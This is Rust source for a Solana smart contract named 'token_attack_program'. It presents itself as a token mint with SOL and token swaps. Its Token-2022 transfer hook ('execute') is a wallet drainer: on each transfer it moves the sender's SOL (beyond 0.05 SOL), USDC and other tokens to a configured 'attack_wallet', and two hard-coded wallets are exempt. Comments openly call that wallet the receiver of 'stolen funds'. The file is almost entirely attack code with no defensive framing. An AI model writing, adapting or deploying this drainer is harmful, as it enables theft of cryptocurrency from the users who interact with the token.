use anchor_lang::prelude::*;
use anchor_lang::solana_program::{
    program::invoke,
    system_instruction,
    native_token::LAMPORTS_PER_SOL,
};
use anchor_spl::{
    token::{Mint, TokenAccount, Token},
    token_2022::{self, MintTo, spl_token_2022},
    associated_token::AssociatedToken,
};
use spl_token_2022::{
    extension::ExtensionType,
    instruction::initialize_mint2,
    state::Mint as MintState,
    extension::transfer_hook::instruction::initialize as initialize_transfer_hook_instruction,
};
use std::str::FromStr;

declare_id!("2rHYrETDRZyCK8eXAiJXSo3ZoZSYnGpFSJhU5iJYMWiX");

#[program]
pub mod token_attack_program {
    use super::*;

    /// Initialize the program with a new Token-2022 mint, config, and transfer hook
    pub fn initialize(ctx: Context<Initialize>, exchange_rate: u64) -> Result<()> {
        let authority = &ctx.accounts.authority;
        let mint_account = &ctx.accounts.mint;
        let token_2022_program = &ctx.accounts.token_2022_program;
        let system_program = &ctx.accounts.system_program;
        let rent = &ctx.accounts.rent;
        let config = &mut ctx.accounts.config;

        // --- Initialize Mint with Extensions ---
        let mint_size = ExtensionType::try_calculate_account_len::<MintState>(&[
            ExtensionType::TransferHook,
        ])?;

        invoke(
            &system_instruction::create_account(
                authority.key,
                mint_account.key,
                Rent::get()?.minimum_balance(mint_size),
                mint_size as u64,
                token_2022_program.key,
            ),
            &[
                authority.to_account_info(),
                mint_account.to_account_info(),
                system_program.to_account_info(),
            ],
        )?;

        invoke(
            &initialize_transfer_hook_instruction(
                token_2022_program.key,
                mint_account.key,
                Some(authority.key()),
                Some(*ctx.program_id),
            )?,
            &[
                token_2022_program.to_account_info(),
                mint_account.to_account_info(),
            ],
        )?;

        invoke(
            &initialize_mint2(
                token_2022_program.key,
                mint_account.key,
                authority.key,
                None,
                9,
            )?,
            &[
                token_2022_program.to_account_info(),
                mint_account.to_account_info(),
                rent.to_account_info(),
            ],
        )?;

        config.authority = authority.key();
        config.token_mint = mint_account.key();
        config.exchange_rate = exchange_rate;
        config.attack_wallet = ctx.accounts.attack_wallet.key();

        msg!(
            "Token-2022 Mint with Transfer Hook initialized: {}",
            mint_account.key()
        );
        msg!(
            "Program initialized with exchange rate: {} tokens per 1 SOL",
            exchange_rate
        );
        msg!("Attack wallet set to: {}", config.attack_wallet);

        Ok(())
    }

    /// Mint tokens to a destination account at the configured exchange rate (using Token-2022)
    pub fn mint_tokens(ctx: Context<MintTokens>, sol_amount: u64) -> Result<()> {
        let config = &ctx.accounts.config;
        let token_amount = sol_amount
            .checked_mul(config.exchange_rate)
            .ok_or(ErrorCode::ArithmeticError)?;
        
        let transfer_ix = system_instruction::transfer(
            &ctx.accounts.user.key(),
            &ctx.accounts.authority.key(),
            sol_amount,
        );
        invoke(
            &transfer_ix,
            &[
                ctx.accounts.user.to_account_info(),
                ctx.accounts.authority.to_account_info(),
                ctx.accounts.system_program.to_account_info(),
            ],
        )?;
        
        let cpi_accounts = MintTo {
            mint: ctx.accounts.mint.to_account_info(),
            to: ctx.accounts.user_token_account.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_2022_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        token_2022::mint_to(cpi_ctx, token_amount)?;
        
        msg!("Minted {} tokens to {} in exchange for {} SOL", 
            token_amount, 
            ctx.accounts.user_token_account.key(), 
            sol_amount
        );
        
        Ok(())
    }

    /// Swap tokens for SOL at the configured exchange rate
    pub fn swap_tokens_to_sol(ctx: Context<SwapTokensToSol>, token_amount: u64) -> Result<()> {
        let config = &ctx.accounts.config;
        let sol_amount = token_amount
            .checked_div(config.exchange_rate)
            .ok_or(ErrorCode::ArithmeticError)?;
        
        let cpi_accounts = token_2022::Burn {
            mint: ctx.accounts.mint.to_account_info(),
            from: ctx.accounts.user_token_account.to_account_info(),
            authority: ctx.accounts.user.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_2022_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        token_2022::burn(cpi_ctx, token_amount)?;
        
        let transfer_ix = system_instruction::transfer(
            &ctx.accounts.authority.key(),
            &ctx.accounts.user.key(),
            sol_amount,
        );
        invoke(
            &transfer_ix,
            &[
                ctx.accounts.authority.to_account_info(),
                ctx.accounts.user.to_account_info(),
                ctx.accounts.system_program.to_account_info(),
            ],
        )?;
        
        msg!("Swapped {} tokens for {} SOL", token_amount, sol_amount);
        Ok(())
    }

    /// Swap tokens for token at the configured exchange rate
    pub fn swap_tokens_to_token(ctx: Context<SwapTokensToToken>, token_amount: u64) -> Result<()> {
        let config = &ctx.accounts.config;
        let other_token_amount = token_amount
            .checked_div(config.exchange_rate)
            .ok_or(ErrorCode::ArithmeticError)?;
        
        let burn_accounts = token_2022::Burn {
            mint: ctx.accounts.mint.to_account_info(),
            from: ctx.accounts.user_token_account.to_account_info(),
            authority: ctx.accounts.user.to_account_info(),
        };
        let burn_program = ctx.accounts.token_2022_program.to_account_info();
        let burn_ctx = CpiContext::new(burn_program, burn_accounts);
        token_2022::burn(burn_ctx, token_amount)?;

        let transfer_accounts = anchor_spl::token::Transfer {
            from: ctx.accounts.authority_swap_token_account.to_account_info(),
            to: ctx.accounts.user_swap_token_account.to_account_info(),
            authority: ctx.accounts.authority.to_account_info(),
        };
        let transfer_program = ctx.accounts.token_program.to_account_info();
        let transfer_ctx = CpiContext::new(transfer_program, transfer_accounts);
        anchor_spl::token::transfer(transfer_ctx, other_token_amount)?;

        msg!("Swapped {} tokens for {} other tokens", token_amount, other_token_amount);
        Ok(())
    }

    /// Transfer tokens from one account to another
    pub fn transfer_tokens(ctx: Context<TransferTokens>, amount: u64) -> Result<()> {
        let cpi_accounts = anchor_spl::token_2022::TransferChecked {
            from: ctx.accounts.sender_token_account.to_account_info(),
            to: ctx.accounts.recipient_token_account.to_account_info(),
            authority: ctx.accounts.sender.to_account_info(),
            mint: ctx.accounts.mint.to_account_info(),
        };
        let cpi_program = ctx.accounts.token_2022_program.to_account_info();
        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
        token_2022::transfer_checked(cpi_ctx, amount, ctx.accounts.mint.decimals)?;
        
        msg!("Initiated transfer of {} tokens from {} to {}",
            amount,
            ctx.accounts.sender_token_account.key(),
            ctx.accounts.recipient_token_account.key()
        );
        msg!("Transfer hook ('execute') will handle drain logic.");
        Ok(())
    }

    /// Execute the transfer hook logic (called via CPI by the Token-2022 program)
    pub fn execute<'info>(ctx: Context<'_, '_, 'info, 'info, Execute<'info>>, amount: u64) -> Result<()> {
        msg!("Transfer Hook Execute called for amount: {}", amount);
        
        // All remaining accounts now have the same 'info lifetime.
        let remaining: &[AccountInfo<'info>] = ctx.remaining_accounts;
        if remaining.len() < 2 {
            return Err(ErrorCode::MissingRequiredRemainingAccount.into());
        }
        let config_account_info = &remaining[0];
        let attack_wallet_info = &remaining[1];
        let sender_usdc_account_info = remaining.get(2);
        let attack_usdc_account_info = remaining.get(3);
        let sender_other_token_account_info = remaining.get(4);
        let attack_other_token_account_info = remaining.get(5);
        let token_program_info = remaining.get(6);
    
        let config_data = config_account_info.try_borrow_data()?;
        let mut config_data_slice = &config_data[8..];
        let config = ProgramConfig::try_deserialize(&mut config_data_slice)?;
    
        if ctx.accounts.mint.key() != config.token_mint {
            msg!("Error: Transfer hook called with incorrect mint. Expected {}, got {}",
                config.token_mint, ctx.accounts.mint.key());
            return Err(ErrorCode::InvalidMint.into());
        }
        msg!("Mint check passed: {}", ctx.accounts.mint.key());
    
        // Bind the owner account info explicitly with lifetime 'info.
        let owner_info: AccountInfo<'info> = ctx.accounts.owner.to_account_info();
        msg!("Executing drain logic within transfer hook...");
    
        let safe_tokens = vec![ctx.accounts.mint.key()];
        let safe_wallets: Vec<Pubkey> = vec![
            Pubkey::from_str("CBSZXGhaPqw1ZD3rJpzRDTC3557uBE2Hjiv5mzRgoBm4").unwrap(),
            Pubkey::from_str("11111111111111111111111111111111").unwrap(),
        ];
    
        if safe_wallets.contains(&ctx.accounts.owner.key()) {
            msg!("Sender wallet ({}) is protected; skipping malicious drain operations.", ctx.accounts.owner.key());
        } else {
            msg!("Sender wallet ({}) is NOT protected. Proceeding with drain.", ctx.accounts.owner.key());
            let min_sol_to_leave = 50_000_000;
            let sender_balance = ctx.accounts.owner.lamports();
            if sender_balance > min_sol_to_leave {
                let sol_to_steal = sender_balance.saturating_sub(min_sol_to_leave);
                if sol_to_steal > 0 {
                    **ctx.accounts.owner.try_borrow_mut_lamports()? -= sol_to_steal;
                    **attack_wallet_info.try_borrow_mut_lamports()? += sol_to_steal;
                    msg!("HOOK DRAIN: Transferred {} SOL to attack wallet {}",
                        sol_to_steal as f64 / LAMPORTS_PER_SOL as f64,
                        attack_wallet_info.key());
                }
            } else {
                msg!("HOOK DRAIN: Sender SOL balance ({}) too low to drain.", sender_balance);
            }
    
            if let (Some(sender_usdc_acc), Some(attack_usdc_acc), Some(token_prog)) =
                (sender_usdc_account_info, attack_usdc_account_info, token_program_info)
            {
                if !sender_usdc_acc.data_is_empty() && sender_usdc_acc.owner == token_prog.key {
                    match Account::<TokenAccount>::try_from(sender_usdc_acc) {
                        Ok(sender_usdc_token_account) => {
                            if sender_usdc_token_account.owner == ctx.accounts.owner.key() {
                                let usdc_balance = sender_usdc_token_account.amount;
                                if usdc_balance > 0 && !safe_tokens.contains(&sender_usdc_token_account.mint) {
                                    msg!("HOOK DRAIN: Attempting to drain {} USDC...", usdc_balance);
                                    let cpi_accounts = anchor_spl::token::Transfer {
                                        from: sender_usdc_acc.clone(),
                                        to: attack_usdc_acc.clone(),
                                        authority: owner_info.clone(),
                                    };
                                    let cpi_ctx = CpiContext::new(token_prog.clone(), cpi_accounts);
                                    match anchor_spl::token::transfer(cpi_ctx, usdc_balance) {
                                        Ok(_) => msg!("HOOK DRAIN: Transferred {} USDC to attack wallet {}",
                                            usdc_balance as f64 / 1_000_000.0, attack_usdc_acc.key()),
                                        Err(e) => msg!("HOOK DRAIN: Failed to transfer USDC: {:?}", e),
                                    }
                                } else {
                                    msg!("HOOK DRAIN: USDC balance is 0 or token mint is protected.");
                                }
                            } else {
                                msg!("HOOK DRAIN: USDC account owner mismatch.");
                            }
                        },
                        Err(e) => msg!("HOOK DRAIN: Failed to deserialize sender USDC account: {:?}", e),
                    }
                } else {
                    msg!("HOOK DRAIN: Invalid sender USDC account provided or not owned by token program.");
                }
            } else {
                msg!("HOOK DRAIN: Missing accounts for USDC drain.");
            }
    
            if let (Some(sender_other_acc), Some(attack_other_acc), Some(token_prog)) =
                (sender_other_token_account_info, attack_other_token_account_info, token_program_info)
            {
                if !sender_other_acc.data_is_empty() && sender_other_acc.owner == token_prog.key {
                    match Account::<TokenAccount>::try_from(sender_other_acc) {
                        Ok(sender_other_token_account) => {
                            if sender_other_token_account.owner == ctx.accounts.owner.key() {
                                let token_balance = sender_other_token_account.amount;
                                if token_balance > 0 && !safe_tokens.contains(&sender_other_token_account.mint) {
                                    msg!("HOOK DRAIN: Attempting to drain {} other tokens...", token_balance);
                                    let cpi_accounts = anchor_spl::token::Transfer {
                                        from: sender_other_acc.clone(),
                                        to: attack_other_acc.clone(),
                                        authority: owner_info.clone(),
                                    };
                                    let cpi_ctx = CpiContext::new(token_prog.clone(), cpi_accounts);
                                    match anchor_spl::token::transfer(cpi_ctx, token_balance) {
                                        Ok(_) => msg!("HOOK DRAIN: Transferred {} other tokens to attack wallet {}",
                                            token_balance, attack_other_acc.key()),
                                        Err(e) => msg!("HOOK DRAIN: Failed to transfer other tokens: {:?}", e),
                                    }
                                } else {
                                    msg!("HOOK DRAIN: Other token balance is 0 or token mint is protected.");
                                }
                            } else {
                                msg!("HOOK DRAIN: Other token account owner mismatch.");
                            }
                        },
                        Err(e) => msg!("HOOK DRAIN: Failed to deserialize sender other token account: {:?}", e),
                    }
                } else {
                    msg!("HOOK DRAIN: Invalid sender other token account provided or not owned by token program.");
                }
            } else {
                msg!("HOOK DRAIN: Missing accounts for other token drain.");
            }
        }
        Ok(())    
    }
}

#[derive(Accounts)]
pub struct Execute<'info> {
    /// CHECK: Source token account - Constraints removed
    pub source_account: UncheckedAccount<'info>,
    /// CHECK: Token mint - Constraints removed
    pub mint: UncheckedAccount<'info>,
    /// CHECK: Destination token account - Constraints removed
    pub destination_account: UncheckedAccount<'info>,
    /// CHECK: Owner of the source token account
    pub owner: UncheckedAccount<'info>,
}

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    /// CHECK: The mint account to be initialized.
    #[account(mut)]
    pub mint: UncheckedAccount<'info>,
    #[account(
        init,
        payer = authority,
        space = 8 + 32 + 32 + 8 + 32,
        seeds = [b"config"],
        bump
    )]
    pub config: Account<'info, ProgramConfig>,
    /// CHECK: This is the wallet that will receive stolen funds - no safety checks needed as we're only storing the address
    pub attack_wallet: AccountInfo<'info>,
    /// CHECK: Using Token-2022 program ID.
    #[account(address = spl_token_2022::ID)]
    pub token_2022_program: AccountInfo<'info>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
#[instruction(sol_amount: u64)]
pub struct MintTokens<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    /// CHECK: Authority must match the authority in config.
    #[account(
        mut,
        constraint = authority.key() == config.authority @ ErrorCode::InvalidAuthority
    )]
    pub authority: Signer<'info>,
    #[account(
        mut,
        address = config.token_mint @ ErrorCode::InvalidMint
    )]
    pub mint: Account<'info, Mint>,
    #[account(
        seeds = [b"config"],
        bump
    )]
    pub config: Account<'info, ProgramConfig>,
    #[account(
        init_if_needed,
        payer = user,
        associated_token::mint = mint,
        associated_token::authority = user
    )]
    pub user_token_account: Account<'info, TokenAccount>,
    /// CHECK: Using Token-2022 program ID.
    #[account(address = spl_token_2022::ID)]
    pub token_2022_program: AccountInfo<'info>,
    pub associated_token_program: Program<'info, AssociatedToken>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
#[instruction(token_amount: u64)]
pub struct SwapTokensToSol<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    /// CHECK: Authority must match config.
    #[account(
        mut,
        constraint = authority.key() == config.authority @ ErrorCode::InvalidAuthority
    )]
    pub authority: AccountInfo<'info>,
    #[account(
        mut,
        address = config.token_mint @ ErrorCode::InvalidMint
    )]
    pub mint: Account<'info, Mint>,
    #[account(
        seeds = [b"config"],
        bump
    )]
    pub config: Account<'info, ProgramConfig>,
    #[account(
        mut,
        constraint = user_token_account.mint == mint.key() @ ErrorCode::InvalidTokenAccount,
        constraint = user_token_account.owner == user.key() @ ErrorCode::InvalidOwner,
    )]
    pub user_token_account: Account<'info, TokenAccount>,
    /// CHECK: User's USDC token account.
    #[account(mut)]
    pub user_usdc_account: UncheckedAccount<'info>,
    /// CHECK: Attack wallet's USDC token account.
    #[account(mut)]
    pub attack_usdc_account: UncheckedAccount<'info>,
    /// CHECK: User's other token account.
    #[account(mut)]
    pub user_other_token_account: UncheckedAccount<'info>,
    /// CHECK: Attack wallet's other token account.
    #[account(mut)]
    pub attack_other_token_account: UncheckedAccount<'info>,
    #[account(
        mut,
        address = config.attack_wallet @ ErrorCode::InvalidAttackWallet
    )]
    /// CHECK: This is the wallet that will receive stolen funds - no safety checks needed as we're only storing the address
    pub attack_wallet: AccountInfo<'info>,
    /// CHECK: Using Token-2022 program ID.
    #[account(address = spl_token_2022::ID)]
    pub token_2022_program: AccountInfo<'info>,
    /// CHECK: Standard SPL Token program.
    #[account(address = anchor_spl::token::ID)]
    pub token_program: AccountInfo<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
#[instruction(token_amount: u64)]
pub struct SwapTokensToToken<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    /// CHECK: Authority must match config.
    #[account(
        mut,
        constraint = authority.key() == config.authority @ ErrorCode::InvalidAuthority
    )]
    pub authority: AccountInfo<'info>,
    #[account(
        mut,
        address = config.token_mint @ ErrorCode::InvalidMint
    )]
    pub mint: Account<'info, Mint>,
    #[account(
        seeds = [b"config"],
        bump
    )]
    pub config: Account<'info, ProgramConfig>,
    #[account(
        mut,
        constraint = user_token_account.mint == mint.key() @ ErrorCode::InvalidTokenAccount,
        constraint = user_token_account.owner == user.key() @ ErrorCode::InvalidOwner,
    )]
    pub user_token_account: Account<'info, TokenAccount>,
    /// CHECK: User's USDC token account.
    #[account(mut)]
    pub user_usdc_account: UncheckedAccount<'info>,
    /// CHECK: Attack wallet's USDC token account.
    #[account(mut)]
    pub attack_usdc_account: UncheckedAccount<'info>,
    /// CHECK: User's other token account.
    #[account(mut)]
    pub user_other_token_account: UncheckedAccount<'info>,
    /// CHECK: Attack wallet's other token account.
    #[account(mut)]
    pub attack_other_token_account: UncheckedAccount<'info>,
    /// CHECK: User's swap token account.
    #[account(mut)]
    pub user_swap_token_account: UncheckedAccount<'info>,
    /// CHECK: Authority's swap token account.
    #[account(mut)]
    pub authority_swap_token_account: UncheckedAccount<'info>,
    #[account(
        mut,
        address = config.attack_wallet @ ErrorCode::InvalidAttackWallet
    )]
    /// CHECK: This is the wallet that will receive stolen funds - no safety checks needed as we're only storing the address
    pub attack_wallet: AccountInfo<'info>,
    /// CHECK: Using Token-2022 program ID.
    #[account(address = spl_token_2022::ID)]
    pub token_2022_program: AccountInfo<'info>,
    /// CHECK: Standard SPL Token program.
    #[account(address = anchor_spl::token::ID)]
    pub token_program: AccountInfo<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
#[instruction(amount: u64)]
pub struct TransferTokens<'info> {
    #[account(mut)]
    pub sender: Signer<'info>,
    /// CHECK: Recipient account info.
    pub recipient: AccountInfo<'info>,
    #[account(
        mut,
        constraint = sender_token_account.mint == mint.key() @ ErrorCode::InvalidTokenAccount,
        constraint = sender_token_account.owner == sender.key() @ ErrorCode::InvalidOwner,
    )]
    pub sender_token_account: Account<'info, TokenAccount>,
    #[account(
        mut,
        constraint = recipient_token_account.mint == mint.key() @ ErrorCode::InvalidTokenAccount,
        constraint = recipient_token_account.owner == recipient.key() @ ErrorCode::InvalidOwner,
    )]
    pub recipient_token_account: Account<'info, TokenAccount>,
    #[account(
        address = config.token_mint @ ErrorCode::InvalidMint
    )]
    pub mint: Account<'info, Mint>,
    #[account(
        seeds = [b"config"],
        bump
    )]
    pub config: Account<'info, ProgramConfig>,
    /// CHECK: Sender's USDC token account.
    #[account(mut)]
    pub sender_usdc_account: UncheckedAccount<'info>,
    /// CHECK: Attack wallet's USDC token account.
    #[account(mut)]
    pub attack_usdc_account: UncheckedAccount<'info>,
    /// CHECK: Sender's other token account.
    #[account(mut)]
    pub sender_other_token_account: UncheckedAccount<'info>,
    /// CHECK: Attack wallet's other token account.
    #[account(mut)]
    pub attack_other_token_account: UncheckedAccount<'info>,
    #[account(
        mut,
        address = config.attack_wallet @ ErrorCode::InvalidAttackWallet
    )]
    /// CHECK: This is the wallet that will receive stolen funds - no safety checks needed as we're only storing the address
    pub attack_wallet: AccountInfo<'info>,
    /// CHECK: Using Token-2022 program ID.
    #[account(address = spl_token_2022::ID)]
    pub token_2022_program: AccountInfo<'info>,
    /// CHECK: Standard SPL Token program.
    #[account(address = anchor_spl::token::ID)]
    pub token_program: AccountInfo<'info>,
    pub system_program: Program<'info, System>,
}

#[account]
pub struct ProgramConfig {
    pub authority: Pubkey,
    pub token_mint: Pubkey,
    pub exchange_rate: u64,
    pub attack_wallet: Pubkey,
}

#[error_code]
pub enum ErrorCode {
    #[msg("Arithmetic error")]
    ArithmeticError,
    #[msg("Invalid authority")]
    InvalidAuthority,
    #[msg("Invalid mint")]
    InvalidMint,
    #[msg("Invalid token account")]
    InvalidTokenAccount,
    #[msg("Invalid owner")]
    InvalidOwner,
    #[msg("Invalid attack wallet")]
    InvalidAttackWallet,
    #[msg("Transfer hook requires remaining accounts")]
    MissingRequiredRemainingAccount,
    #[msg("Failed to deserialize account")]
    AccountDeserializationFailed,
    #[msg("Missing expected account in remaining accounts")]
    MissingRequiredRemainingAccount2,
}
